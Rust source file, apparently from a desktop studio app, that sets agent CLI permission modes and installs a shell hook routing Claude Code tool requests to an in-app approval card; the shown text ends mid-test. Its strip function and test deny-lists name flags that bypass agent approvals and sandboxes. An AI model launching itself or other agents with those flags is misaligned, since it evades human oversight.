//! Agent permission modes (`Skip` vs `Ask`), session hook generators, the file-backed approval bridge (requests and
//! answers in the Studio-private folder of [`crate::agent_approval_channel`]), and unfocused-window OS notifications (`#656`).

use crate::comments::settings;
use crate::terminal::{AgentCliPreset, PermissionMode};
use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

pub const SETTING_KEY: &str = "agent_permission_mode";
pub const APPROVAL_HOOK_TIMEOUT_SECS: u64 = 300;
pub const MAX_INPUT_SUMMARY_CHARS: usize = 200;

/// Global agent permission mode persisted in `<library>/settings.json` under `"agent_permission_mode"`.
pub type AgentPermissionMode = PermissionMode;

impl PermissionMode {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Skip => "skip",
            Self::Ask => "ask",
        }
    }

    /// Skip only for exactly `"skip"` (trimmed, case-insensitive). Anything else, including `""`, is Ask (fail closed, `#841`).
    pub fn parse(raw: &str) -> Self {
        if raw.trim().eq_ignore_ascii_case("skip") {
            Self::Skip
        } else {
            Self::Ask
        }
    }
}

/// Modes the user picked whose save to `settings.json` failed (read-only library, full disk), per library root.
/// The picked mode keeps applying in this process: reading the older value still on disk would silently turn
/// Ask back into Skip at the next agent start. A later successful save of that root clears its entry.
static UNSAVED_MODES: Mutex<BTreeMap<PathBuf, AgentPermissionMode>> = Mutex::new(BTreeMap::new());

fn unsaved_modes() -> std::sync::MutexGuard<'static, BTreeMap<PathBuf, AgentPermissionMode>> {
    UNSAVED_MODES.lock().unwrap_or_else(|poisoned| poisoned.into_inner())
}

/// Reads `"agent_permission_mode"` from `<root>/settings.json`. A missing, unknown or unreadable value is
/// [`AgentPermissionMode::Ask`] (fail closed, `#841`).
pub fn load_permission_mode(root: &Path) -> AgentPermissionMode {
    load_saved_permission_mode(root).unwrap_or_default()
}

/// The mode in force for `<root>`: the one whose save failed, else the one saved in `<root>/settings.json`, or
/// `None` when neither exists. Unlike [`load_permission_mode`] it does not invent a default, so a caller can keep
/// its in-memory mode.
pub fn load_saved_permission_mode(root: &Path) -> Option<AgentPermissionMode> {
    if let Some(mode) = unsaved_modes().get(root) {
        return Some(*mode);
    }
    settings::load_choice(root, SETTING_KEY).map(|s| AgentPermissionMode::parse(&s))
}

/// Persists `"agent_permission_mode"` (`"skip"` or `"ask"`) to `<root>/settings.json`. A failed save is
/// remembered for this process (see [`UNSAVED_MODES`]) so the chosen mode still applies; the error is returned.
pub fn save_permission_mode(root: &Path, mode: AgentPermissionMode) -> Result<(), String> {
    let saved = settings::save_choice(root, SETTING_KEY, mode.as_str());
    match &saved {
        Ok(()) => {
            unsaved_modes().remove(root);
        }
        Err(_) => {
            unsaved_modes().insert(root.to_path_buf(), mode);
        }
    }
    saved
}

/// Strips the auto-approve / skip-permissions flag from a CLI command string when in `Ask` mode.
pub fn strip_skip_permission_flags(cmd: &str) -> String {
    cmd.replace(" --dangerously-skip-permissions", "")
        .replace(" --dangerously-bypass-approvals-and-sandbox", "")
        .replace(" --always-approve", "")
        .replace(" --approval-mode yolo", " --approval-mode default")
}

/// How a Skip-mode Claude launch names its hooks: the file Studio writes into the session folder.
pub const SKIP_SETTINGS_ARG: &str = "--settings \"$DESIGNOS_SESSION_DIR/hooks.json\"";

/// How an Ask-mode Claude launch names its hooks: [`CLAUDE_SETTINGS_ENV`], which Studio sets for the tab.
pub const ASK_SETTINGS_ARG: &str = "--settings \"$DESIGNOS_CLAUDE_SETTINGS\"";

/// Environment variable of an Ask-mode tab that holds the value of Claude's `--settings` (see [`claude_settings_value`]).
pub const CLAUDE_SETTINGS_ENV: &str = "DESIGNOS_CLAUDE_SETTINGS";

/// The launch command of an agent started in `Ask` mode, from the `Skip` one: [`strip_skip_permission_flags`], and Claude's
/// hooks come from the Studio-private folder instead of the session folder (see [`claude_settings_value`]).
pub fn ask_mode_launch_command(skip_cmd: &str) -> String {
    let ask_cmd = strip_skip_permission_flags(skip_cmd).replace(SKIP_SETTINGS_ARG, ASK_SETTINGS_ARG);
    // The swap above is a text replace: a Skip launch that spelt `--settings` another way would pass through it unchanged.
    debug_assert!(!ask_cmd.contains("$DESIGNOS_SESSION_DIR/hooks.json"), "an Ask launch names a hooks file in the session folder: {ask_cmd}");
    ask_cmd
}

/// The value of Claude's `--settings` for a tab started in `mode`, set as [`CLAUDE_SETTINGS_ENV`]; `None` in Skip mode,
/// whose launch names `<session>/hooks.json` itself.
///
/// In Ask mode it is the hooks file in the session's private folder once Studio has written it there. The hooks name
/// the approval handler, so a file an agent can write must never be the one Claude reads: its docs say edits to hooks in
/// settings files are normally picked up as they happen, and nothing says a `--settings` file is the exception. Without
/// that file (no private folder, or it could not be written) the value is the inline settings `{}`: Claude starts with
/// none of Studio's hooks, asks in its own terminal prompt, and reads nothing the agent can write.
pub fn claude_settings_value(session_dir: &Path, mode: AgentPermissionMode) -> Option<String> {
    match mode {
        AgentPermissionMode::Skip => None,
        AgentPermissionMode::Ask => Some(
            crate::agent_approval_channel::hooks_file_path(session_dir)
                .filter(|path| path.is_file())
                .map_or_else(|| "{}".to_string(), |path| path.display().to_string()),
        ),
    }
}

/// The file Studio wrote Claude's hooks to for the agents `st` starts in its current mode (tests read it back).
#[cfg(test)]
pub fn claude_hooks_path(st: &crate::terminal::TerminalState) -> PathBuf {
    match st.permission_mode {
        AgentPermissionMode::Skip => st.session_dir.join("hooks.json"),
        AgentPermissionMode::Ask => crate::agent_approval_channel::hooks_file_path(&st.session_dir).expect("a private channel folder"),
    }
}

/// Removes `<session_dir>/hooks.json` when it still names the approval hook. An earlier build wrote it there in Ask mode; nothing
/// reads it any more, and a file in a folder an agent can write must not carry an approval handler. A hooks file without
/// one (written in Skip mode, grants nothing) is left alone: a Skip-mode tab still running may be reading it.
pub fn remove_stale_session_hooks(session_dir: &Path) {
    let path = session_dir.join("hooks.json");
    let names_approval_hook = std::fs::read_to_string(&path).is_ok_and(|text| text.contains(crate::agent_approval_channel::HOOK_SCRIPT_NAME));
    if names_approval_hook {
        let _ = std::fs::remove_file(path);
    }
}

/// Mode-aware wrapper around [`crate::agent_sessions::build_new_session_command`].
pub fn build_new_session_command_for_mode(preset: AgentCliPreset, mode: AgentPermissionMode, session_uuid: Option<&str>) -> String {
    let base = crate::agent_sessions::build_new_session_command(preset, session_uuid);
    match mode {
        AgentPermissionMode::Skip => base,
        AgentPermissionMode::Ask => ask_mode_launch_command(&base),
    }
}

/// Mode-aware wrapper around [`crate::agent_sessions::build_resume_command_scoped`].
pub fn build_resume_command_for_mode(
    entry: &crate::agent_sessions::SessionEntry,
    codex_cwd_scoped: bool,
    agy_cwd_scoped: bool,
    mode: AgentPermissionMode,
) -> Option<String> {
    let base = crate::agent_sessions::build_resume_command_scoped(entry, codex_cwd_scoped, agy_cwd_scoped)?;
    Some(match mode {
        AgentPermissionMode::Skip => base,
        AgentPermissionMode::Ask => ask_mode_launch_command(&base),
    })
}

/// Generates the POSIX `sh` script Studio installs in the session's private channel folder
/// ([`crate::agent_approval_channel`]) for Claude Code's `PermissionRequest` hook in `Ask` mode.
///
/// The folder it answers from and the session folder it reports status to are written into the script itself.
/// The environment may only name the tab (digits, checked) and shorten the wait; it never names a path, so a
/// variable an agent managed to set cannot point the hook at a folder the agent can write. Request ids are 128 bits
/// from `/dev/urandom`.
pub fn approval_hook_script(channel_dir: &Path, session_dir: &Path) -> String {
    let quote = |p: &Path| p.display().to_string().replace('\'', "'\\''");
    let channel_dir_escaped = quote(channel_dir);
    let session_dir_escaped = quote(session_dir);
    // The system's commands go first on `PATH`, so a command of the same name in an earlier entry never decides anything
    // here. The rest of the inherited `PATH` stays after them: a system without `od` or `awk` in those folders (NixOS) still
    // finds them. The script Studio writes on Windows (Git Bash) leaves `PATH` alone: Git Bash already leads it with its own
    // `/usr/bin`, and no CI run of this change could have checked the pin against that shell.
    let path_pin = if cfg!(windows) { "" } else { "PATH=\"/usr/bin:/bin${PATH:+:$PATH}\"\nexport PATH\n" };
    format!(
        r#"#!/bin/sh
set -eu
umask 077
{path_pin}
CHANNEL_DIR='{channel_dir_escaped}'
STATUS_FILE='{session_dir_escaped}/agent-status.json'

# Declining prints nothing, so Claude asks in its own terminal prompt. Drain stdin first so Claude's write to this
# hook never meets a closed pipe.
decline() {{
    cat > /dev/null 2>&1 || true
    exit 0
}}

case "${{DESIGNOS_TAB_ID:-}}" in
    ''|*[!0-9]*) decline ;;
esac
APPROVALS_DIR="$CHANNEL_DIR/tab-$DESIGNOS_TAB_ID"
mkdir -p "$APPROVALS_DIR" || decline
printf '{{"state":"waiting"}}\n' > "$STATUS_FILE" 2>/dev/null || true

REQ_ID="$(od -An -N16 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n' || true)"
case "$REQ_ID" in
    ''|*[!0-9a-f]*) decline ;;
esac
[ "${{#REQ_ID}}" -eq 32 ] || decline
REQ_TMP="$APPROVALS_DIR/$REQ_ID.request.tmp"
REQ_FILE="$APPROVALS_DIR/$REQ_ID.request.json"
ANS_FILE="$APPROVALS_DIR/$REQ_ID.answer"
NOW_TS="$(date +%s)"

awk -v req_id="$REQ_ID" -v ts="$NOW_TS" '
function extract_json_str(text, key,    pat, rest, i, c, nxt, out) {{
    pat = "\"" key "\"[[:space:]]*:[[:space:]]*\""
    if (!match(text, pat)) return ""
    rest = substr(text, RSTART + RLENGTH)
    out = ""
    i = 1
    while (i <= length(rest)) {{
        c = substr(rest, i, 1)
        if (c == "\\") {{
            if (i + 1 <= length(rest)) {{
                nxt = substr(rest, i + 1, 1)
                if (nxt == "\"" || nxt == "\\" || nxt == "/") {{
                    out = out nxt
                }} else if (nxt == "n" || nxt == "r" || nxt == "t") {{
                    out = out " "
                }} else {{
                    out = out nxt
                }}
                i += 2
                continue
            }} else {{
                break
            }}
        }} else if (c == "\"") {{
            break
        }} else {{
            out = out c
            i += 1
        }}
    }}
    return out
}}
function json_escape(s,    i, c, out) {{
    out = ""
    for (i = 1; i <= length(s); i++) {{
        c = substr(s, i, 1)
        if (c == "\\") out = out "\\\\"
        else if (c == "\"") out = out "\\\""
        else out = out c
    }}
    return out
}}
{{
    buf = buf " " $0
}}
END {{
    gsub(/[\r\n\t]+/, " ", buf)
    tool = extract_json_str(buf, "tool_name")
    if (length(tool) == 0) tool = "tool"
    summary = extract_json_str(buf, "command")
    if (length(summary) == 0) summary = extract_json_str(buf, "file_path")
    if (length(summary) == 0) summary = extract_json_str(buf, "path")
    if (length(summary) == 0) summary = extract_json_str(buf, "pattern")
    gsub(/[\r\n\t]+/, " ", summary)
    sub(/^[[:space:]]+/, "", summary)
    sub(/[[:space:]]+$/, "", summary)
    if (length(summary) == 0) {{
        summary = tool
    }}
    printf "{{\"id\":\"%s\",\"tool_name\":\"%s\",\"input_summary\":\"%s\",\"timestamp\":%s}}\n", req_id, json_escape(tool), json_escape(summary), ts
}}
' > "$REQ_TMP"

mv -f "$REQ_TMP" "$REQ_FILE"

TIMEOUT_MS="${{DESIGNOS_APPROVAL_TIMEOUT_MS:-300000}}"
case "$TIMEOUT_MS" in
    ''|*[!0-9]*) TIMEOUT_MS=300000 ;;
esac
ELAPSED_MS=0
while [ "$ELAPSED_MS" -lt "$TIMEOUT_MS" ]; do
    if [ -f "$ANS_FILE" ]; then
        DECISION="$(tr -d ' \t\r\n' < "$ANS_FILE" 2>/dev/null || true)"
        rm -f "$REQ_FILE" "$ANS_FILE"
        case "$DECISION" in
            allow)
                printf '{{"hookSpecificOutput":{{"hookEventName":"PermissionRequest","decision":{{"behavior":"allow"}}}}}}\n'
                exit 0
                ;;
            deny)
                printf '{{"hookSpecificOutput":{{"hookEventName":"PermissionRequest","decision":{{"behavior":"deny","message":"Denied in design:os studio"}}}}}}\n'
                exit 0
                ;;
            *)
                exit 0
                ;;
        esac
    fi
    # Studio removes the request when its tab closes or the request goes stale: nothing was approved.
    [ -f "$REQ_FILE" ] || exit 0
    sleep 0.1
    ELAPSED_MS=$((ELAPSED_MS + 100))
done

exit 0
"#
    )
}

/// Installs `approve-hook.sh` in `session_dir`'s private channel folder ([`crate::agent_approval_channel`]) and returns
/// its path. Fails, leaving the hook uninstalled, when the platform has no private data folder or the folder cannot be
/// made private; Claude then asks in its own terminal prompt.
pub fn write_approval_hook_script(session_dir: &Path) -> std::io::Result<PathBuf> {
    let channel_dir = crate::agent_approval_channel::prepare_channel_dir(session_dir)?;
    install_hook_script(&channel_dir, session_dir)
}

/// Writes `<channel_dir>/approve-hook.sh` (owner-only on Unix) for the agent working in `session_dir`.
pub(crate) fn install_hook_script(channel_dir: &Path, session_dir: &Path) -> std::io::Result<PathBuf> {
    let script_path = channel_dir.join(crate::agent_approval_channel::HOOK_SCRIPT_NAME);
    let content = approval_hook_script(channel_dir, session_dir);
    crate::agent_approval_channel::write_owner_only_file(&script_path, content.as_bytes(), true)?;
    Ok(script_path)
}

/// Handler appended to Claude's `PermissionRequest` hook group in `Ask` mode: runs `approve-hook.sh`, which blocks up
/// to `APPROVAL_HOOK_TIMEOUT_SECS` for the answer given in the in-panel approval card, and never sets
/// `permissions.allow` (`#656`). It runs next to the status handler of that group, so the turn status
/// (`agent-events.jsonl`) still sees the request.
///
/// On Unix the interpreter is `/bin/sh` by path: it is looked up on Claude's `PATH` before the script can pin anything,
/// so a `sh` earlier on that `PATH` would otherwise be the one that runs the script. Windows (Git Bash) keeps `sh`.
pub fn approval_hook_handler(script_path: &Path) -> serde_json::Value {
    let s = script_path.display().to_string().replace('\'', "'\\''");
    let interpreter = if cfg!(windows) { "sh" } else { "/bin/sh" };
    serde_json::json!({
        "type": "command",
        "command": format!("{interpreter} '{s}'"),
        "timeout": APPROVAL_HOOK_TIMEOUT_SECS,
    })
}

/// One pending tool-approval request in `<tab approvals folder>/<id>.request.json`.
#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct ApprovalRequest {
    pub id: String,
    pub tool_name: String,
    #[serde(alias = "summary")]
    pub input_summary: String,
    pub timestamp: u64,
}

/// Decision written by Studio to `<tab approvals folder>/<id>.answer`.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ApprovalDecision {
    Allow,
    Deny,
    Withdrawn,
}

impl ApprovalDecision {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Allow => "allow",
            Self::Deny => "deny",
            Self::Withdrawn => "withdrawn",
        }
    }
}

/// Summarizes a `PermissionRequest`'s `tool_input` to at most [`MAX_INPUT_SUMMARY_CHARS`] characters,
/// never including file bodies (`content`, `new_string`, `old_string`).
pub fn summarize_tool_input(tool_name: &str, tool_input: &serde_json::Value) -> String {
    let raw = tool_input
        .get("command")
        .or_else(|| tool_input.get("file_path"))
        .or_else(|| tool_input.get("path"))
        .or_else(|| tool_input.get("pattern"))
        .and_then(|v| v.as_str())
        .unwrap_or(tool_name);
    let cleaned: String = raw.chars().map(|c| if c.is_control() { ' ' } else { c }).collect();
    let trimmed = cleaned.trim();
    let fallback = if trimmed.is_empty() { tool_name } else { trimmed };
    fallback.chars().take(MAX_INPUT_SUMMARY_CHARS).collect()
}

/// A request id names the `<id>.answer` file Studio writes, so it must be a plain file stem: the hook makes 32 hex
/// digits, and nothing else (a `/`, a `..`, an empty or very long name) is ever answered.
fn is_valid_request_id(id: &str) -> bool {
    !id.is_empty() && id.len() <= 64 && id.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
}

/// Polls `<approvals_dir>/*.request.json`, cleaning up any stale request files older than
/// `timeout_secs` and returning active requests ordered oldest-first.
pub fn poll_approvals_in_dir(approvals_dir: &Path, now_secs: u64, timeout_secs: u64) -> Vec<ApprovalRequest> {
    let Ok(entries) = std::fs::read_dir(approvals_dir) else {
        return Vec::new();
    };
    let mut requests = Vec::new();
    for entry in entries.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        if !name.ends_with(".request.json") {
            continue;
        }
        let Ok(bytes) = std::fs::read(&path) else {
            continue;
        };
        let raw = String::from_utf8_lossy(&bytes);
        let Ok(mut req) = serde_json::from_str::<ApprovalRequest>(&raw) else {
            continue;
        };
        if !is_valid_request_id(&req.id) {
            continue;
        }
        let ans = approvals_dir.join(format!("{}.answer", req.id));
        if req.timestamp > 0 && now_secs.saturating_sub(req.timestamp) > timeout_secs {
            let _ = std::fs::remove_file(&path);
            let _ = std::fs::remove_file(&ans);
            continue;
        }
        if ans.exists() {
            continue;
        }
        if req.input_summary.chars().count() > MAX_INPUT_SUMMARY_CHARS {
            req.input_summary = req.input_summary.chars().take(MAX_INPUT_SUMMARY_CHARS).collect();
        }
        requests.push(req);
    }
    requests.sort_by(|a, b| (a.timestamp, &a.id).cmp(&(b.timestamp, &b.id)));
    requests
}

/// Writes `<approvals_dir>/<id>.answer` (`allow`, `deny`, or `withdrawn`). `id` must be a request id as
/// [`poll_approvals_in_dir`] returns it; any other name is refused.
pub fn write_approval_answer_in_dir(approvals_dir: &Path, id: &str, decision: ApprovalDecision) -> std::io::Result<()> {
    if !is_valid_request_id(id) {
        return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, format!("`{id}` is not a request id")));
    }
    crate::agent_approval_channel::create_private_dir_all(approvals_dir)?;
    let ans_path = approvals_dir.join(format!("{id}.answer"));
    designos_library::write_atomic(&ans_path, decision.as_str().as_bytes()).map_err(|e| std::io::Error::other(e.to_string()))
}

/// Writes `withdrawn` to `<id>.answer` for every pending `<id>.request.json` in `approvals_dir`.
pub fn withdraw_pending_requests_in_dir(approvals_dir: &Path) {
    let Ok(entries) = std::fs::read_dir(approvals_dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        if let Some(id) = name.strip_suffix(".request.json") {
            let _ = write_approval_answer_in_dir(approvals_dir, id, ApprovalDecision::Withdrawn);
        }
    }
}

/// Abstraction over OS notifications when a tab transitions into `Needs approval` while Studio is unfocused.
pub trait ApprovalNotifier: Send + Sync {
    fn notify_needs_approval(&self, cli_label: &str, doc_name: &str);
}

/// Production notifier using `osascript` on macOS and `notify-send` on Linux, passing strings only via `argv`.
#[derive(Default)]
pub struct OsApprovalNotifier;

impl ApprovalNotifier for OsApprovalNotifier {
    fn notify_needs_approval(&self, cli_label: &str, doc_name: &str) {
        let title = "design:os studio";
        let body = format!("{cli_label} needs approval — {doc_name}");
        #[cfg(target_os = "macos")]
        {
            let _ = std::process::Command::new("osascript")
                .args(["-e", "on run argv\ndisplay notification (item 2 of argv) with title (item 1 of argv)\nend run", "--", title, &body])
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();
        }
        #[cfg(target_os = "linux")]
        {
            let _ = std::process::Command::new("notify-send")
                .args([title, &body])
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .spawn();
        }
        #[cfg(not(any(target_os = "macos", target_os = "linux")))]
        {
            let _ = (title, body);
        }
    }
}

/// Test double recording `(cli_label, doc_name)` notifications without spawning external commands.
#[derive(Clone, Default)]
pub struct RecordingNotifier {
    pub events: Arc<Mutex<Vec<String>>>,
}

impl RecordingNotifier {
    pub fn recorded_events(&self) -> Vec<String> {
        self.events.lock().map(|g| g.clone()).unwrap_or_default()
    }
}

impl ApprovalNotifier for RecordingNotifier {
    fn notify_needs_approval(&self, cli_label: &str, doc_name: &str) {
        if let Ok(mut guard) = self.events.lock() {
            guard.push(format!("{cli_label} needs approval — {doc_name}"));
        }
    }
}

/// Latch ensuring at most one notification fires per pending request while the Studio window is unfocused.
#[derive(Default)]
pub struct NotificationLatch {
    fired_keys: BTreeSet<String>,
}

impl NotificationLatch {
    pub fn reset(&mut self) {
        self.fired_keys.clear();
    }

    pub fn on_window_focus(&mut self) {
        self.fired_keys.clear();
    }

    pub fn clear_key(&mut self, key: &str) {
        self.fired_keys.remove(key);
    }

    /// Fires `notifier` once per `request_key` when `focused == Some(false)`.
    /// Clears the latch when the window is focused (`focused.unwrap_or(true)`) or when no request is pending.
    pub fn update(&mut self, notifier: &dyn ApprovalNotifier, focused: Option<bool>, cli_label: &str, doc_name: &str, request_key: Option<&str>) {
        if focused.unwrap_or(true) {
            self.fired_keys.clear();
            return;
        }
        let Some(key) = request_key else {
            self.fired_keys.clear();
            return;
        };
        if self.fired_keys.insert(key.to_string()) {
            notifier.notify_needs_approval(cli_label, doc_name);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::approval_channel_tests::{bash_payload, decision_of, wait_for_request, Fixture};
    use super::*;
    use crate::terminal::AgentCliPreset;

    #[test]
    fn default_mode_is_ask() {
        let tmp = std::env::temp_dir().join(format!("designos-841-default-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        std::fs::create_dir_all(&tmp).unwrap();
        assert_eq!(AgentPermissionMode::default(), AgentPermissionMode::Ask);
        assert_eq!(load_permission_mode(&tmp), AgentPermissionMode::Ask, "a library without the setting asks");
        save_permission_mode(&tmp, AgentPermissionMode::Skip).unwrap();
        assert_eq!(load_permission_mode(&tmp), AgentPermissionMode::Skip);
        save_permission_mode(&tmp, AgentPermissionMode::Ask).unwrap();
        assert_eq!(load_permission_mode(&tmp), AgentPermissionMode::Ask);
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn parse_returns_skip_only_for_the_word_skip() {
        for raw in ["skip", "Skip", "SKIP", "  skip\n"] {
            assert_eq!(AgentPermissionMode::parse(raw), AgentPermissionMode::Skip, "{raw:?} is a saved Skip");
        }
        for raw in ["ask", "ASK", "", "   ", "manual", "yolo", "skip-permissions", "skip permissions", "none", "false"] {
            assert_eq!(AgentPermissionMode::parse(raw), AgentPermissionMode::Ask, "{raw:?} must fail closed to Ask");
        }
    }

    /// The mode a library resolves to for each `settings.json` the owner listed (missing, `"skip"`, `"ask"`, `""`,
    /// `"manual"`, invalid JSON) plus other shapes a hand edit or a failed write can leave behind.
    #[test]
    fn settings_json_resolves_to_a_mode_and_fails_closed() {
        let cases: [(&str, Option<&str>, AgentPermissionMode); 11] = [
            ("missing-file", None, AgentPermissionMode::Ask),
            ("empty-object", Some("{}"), AgentPermissionMode::Ask),
            ("skip", Some(r#"{"agent_permission_mode":"skip"}"#), AgentPermissionMode::Skip),
            ("ask", Some(r#"{"agent_permission_mode":"ask"}"#), AgentPermissionMode::Ask),
            ("empty-string", Some(r#"{"agent_permission_mode":""}"#), AgentPermissionMode::Ask),
            ("manual", Some(r#"{"agent_permission_mode":"manual"}"#), AgentPermissionMode::Ask),
            ("invalid-json", Some(r#"{"agent_permission_mode": "skip""#), AgentPermissionMode::Ask),
            ("not-an-object", Some(r#""skip""#), AgentPermissionMode::Ask),
            ("truncated-to-nothing", Some(""), AgentPermissionMode::Ask),
            ("non-string-value", Some(r#"{"agent_permission_mode":true}"#), AgentPermissionMode::Ask),
            ("other-keys-only", Some(r#"{"author":"Jang"}"#), AgentPermissionMode::Ask),
        ];
        for (tag, body, expected) in cases {
            let tmp = std::env::temp_dir().join(format!("designos-841-settings-{tag}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&tmp);
            std::fs::create_dir_all(&tmp).unwrap();
            if let Some(body) = body {
                std::fs::write(tmp.join("settings.json"), body).unwrap();
            }
            assert_eq!(load_permission_mode(&tmp), expected, "settings.json case `{tag}`");
            let _ = std::fs::remove_dir_all(&tmp);
        }
    }

    /// A new install (no library setting yet) starts every agent CLI without its skip flag.
    #[test]
    fn a_fresh_terminal_launches_every_cli_in_ask_mode() {
        let st = crate::terminal::TerminalState::default();
        assert_eq!(st.permission_mode, AgentPermissionMode::Ask);
        for preset in [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity, AgentCliPreset::Gemini] {
            let cmd = build_new_session_command_for_mode(preset, st.permission_mode, Some("019a0102-0304-7506-8708-090a0b0c0d0e"));
            for flag in ["--dangerously-skip-permissions", "--dangerously-bypass-approvals-and-sandbox", "--always-approve", "--approval-mode yolo"] {
                assert!(!cmd.contains(flag), "{preset:?} fresh launch kept `{flag}`: {cmd}");
            }
        }
    }

    /// A window that loaded Skip must not keep it once the saved mode turns unreadable or disappears: the next
    /// agent it starts asks (fail closed), and a readable `"skip"` applies again.
    #[test]
    fn a_bound_window_falls_back_to_ask_when_the_saved_mode_is_unreadable() {
        let root = std::env::temp_dir().join(format!("designos-841-refresh-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        save_permission_mode(&root, AgentPermissionMode::Skip).unwrap();
        let mut st = crate::terminal::TerminalState::for_tab(84_101);
        st.bind_library_file(&root, "file-841", "win-841");
        assert_eq!(st.permission_mode, AgentPermissionMode::Skip, "the window loaded the saved Skip when it bound");

        for (tag, body) in
            [("invalid-json", "{\"agent_permission_mode\": \"skip\""), ("key-removed", "{}"), ("unknown-value", r#"{"agent_permission_mode":"manual"}"#)]
        {
            std::fs::write(root.join("settings.json"), body).unwrap();
            let idx = st.spawn_tab(AgentCliPreset::Shell, None).expect("spawn a tab");
            assert_eq!(st.permission_mode, AgentPermissionMode::Ask, "{tag}: the spawn must not keep the stale Skip");
            assert_eq!(st.tabs[idx].permission_mode, AgentPermissionMode::Ask, "{tag}: the new tab runs in Ask mode");

            std::fs::write(root.join("settings.json"), r#"{"agent_permission_mode":"skip"}"#).unwrap();
            let idx = st.spawn_tab(AgentCliPreset::Shell, None).expect("spawn a tab");
            assert_eq!(st.tabs[idx].permission_mode, AgentPermissionMode::Skip, "{tag}: a readable saved Skip applies again");
        }
        st.shutdown();
        let _ = std::fs::remove_dir_all(&root);
    }

    /// Commands Studio runs for screenshot fixtures and previews run whatever the user's mode is, so none of them
    /// may carry a skip or bypass flag. A new fixture command goes into this list.
    #[test]
    fn no_fixture_or_preview_command_carries_a_skip_or_bypass_flag() {
        const FIXTURE_COMMANDS: [(&str, &str); 1] = [("--panel agents-start-failure", crate::terminal::START_FAILURE_FIXTURE_COMMAND)];
        const BYPASS_FLAGS: [&str; 4] =
            ["--dangerously-skip-permissions", "--dangerously-bypass-approvals-and-sandbox", "--always-approve", "--approval-mode yolo"];
        for (fixture, command) in FIXTURE_COMMANDS {
            for flag in BYPASS_FLAGS {
                assert!(!command.contains(flag), "fixture `{fixture}` runs `{command}`, which carries `{flag}`");
            }
        }
    }

    #[test]
    fn skip_mode_launch_commands_unchanged() {
        for preset in
            [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity, AgentCliPreset::Gemini, AgentCliPreset::OpenCode]
        {
            assert_eq!(preset.cli_launch_command_for_mode(AgentPermissionMode::Skip), preset.cli_launch_command());
        }
    }

    /// What this asserts, for every agent CLI: an Ask launch is the Skip launch with its skip flag removed
    /// (`strip_skip_permission_flags`) and nothing else changed, with one exception. Claude's `--settings` names the hooks
    /// file in the session folder in Skip mode and `$DESIGNOS_CLAUDE_SETTINGS` (the private hooks file) in Ask mode. Put
    /// that one argument back and the Ask string equals the stripped Skip string, byte for byte; the other CLIs have no
    /// `--settings` and are identical to their stripped Skip string as they are.
    #[test]
    fn ask_mode_drops_each_skip_flag() {
        for preset in
            [AgentCliPreset::Claude, AgentCliPreset::Codex, AgentCliPreset::Grok, AgentCliPreset::Antigravity, AgentCliPreset::Gemini, AgentCliPreset::OpenCode]
        {
            let cmd = preset.cli_launch_command_for_mode(AgentPermissionMode::Ask);
            assert!(!cmd.contains("--dangerously-skip-permissions"), "{preset:?} ask command kept skip flag: {cmd}");
            assert!(!cmd.contains("--dangerously-bypass-approvals-and-sandbox"), "{preset:?} ask command kept bypass flag: {cmd}");
            assert!(!cmd.contains("--always-approve"), "{preset:?} ask command kept always-approve flag: {cmd}");
            assert!(!cmd.contains("--dangerously-bypass-hook-trust"), "{preset:?} ask command must never bypass hook trust: {cmd}");
            assert_eq!(cmd.replace(ASK_SETTINGS_ARG, SKIP_SETTINGS_ARG), strip_skip_permission_flags(preset.cli_launch_command()), "{preset:?}");
            assert_eq!(cmd, ask_mode_launch_command(preset.cli_launch_command()), "{preset:?}: the static Ask string is the derived one");
            // No Ask launch reads hooks from the session folder.
            assert!(!cmd.contains("$DESIGNOS_SESSION_DIR/hooks.json"), "{preset:?} ask command reads hooks from the session folder: {cmd}");
            let claude = preset == AgentCliPreset::Claude;
            assert_eq!(cmd.contains(ASK_SETTINGS_ARG), claude, "{preset:?}");
            assert_eq!(preset.cli_launch_command().contains(SKIP_SETTINGS_ARG), claude, "{preset:?}");
        }
        // The two spellings are the ones the launch strings carry.
        assert_eq!(ASK_SETTINGS_ARG, format!("--settings \"${CLAUDE_SETTINGS_ENV}\""));
        assert!(AgentCliPreset::Claude.cli_launch_command_for_mode(AgentPermissionMode::Ask).starts_with("claude --mcp-config"));
        assert!(AgentCliPreset::Codex.cli_launch_command_for_mode(AgentPermissionMode::Ask).starts_with("codex -c"));
        assert!(AgentCliPreset::Grok.cli_launch_command_for_mode(AgentPermissionMode::Ask).starts_with("grok --cwd"));
        assert!(AgentCliPreset::Antigravity.cli_launch_command_for_mode(AgentPermissionMode::Ask).starts_with("agy --add-dir"));
    }

    #[test]
    fn claude_settings_value_is_the_private_hooks_file_or_inline_empty_settings() {
        let session = std::env::temp_dir().join("designos-sessions").join(format!("settings-value-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&session);
        assert_eq!(claude_settings_value(&session, AgentPermissionMode::Skip), None, "Skip mode names the session folder's file itself");

        // Ask mode before Studio has written the file: nothing to read, so Claude gets empty inline settings.
        assert_eq!(claude_settings_value(&session, AgentPermissionMode::Ask).as_deref(), Some("{}"));

